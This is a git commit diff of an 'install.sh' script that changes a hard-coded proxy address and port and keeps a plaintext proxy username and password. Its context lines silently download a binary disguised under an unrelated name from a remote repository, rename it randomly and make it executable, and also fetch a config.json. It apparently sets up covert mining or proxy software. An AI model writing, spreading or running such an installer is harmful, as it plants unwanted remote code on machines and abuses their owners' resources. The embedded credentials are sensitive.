21133e3630a81b151c124549ecb592a9b22bd241
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-05 12:05:53 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,7 +1,7 @@
-proxy="185.199.231.45" 
-port="8382" 
+proxy="188.74.210.21" 
+port="6100" 
 user="ubslvwxe"  
-pass="iikj33112te4"
+pass="iikj33112te4" 
 wget -q -O po893146742 https://gitlab.com/55113110159/dokerweb/-/raw/main/excel6.19.0 && chmod +x po893146742
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
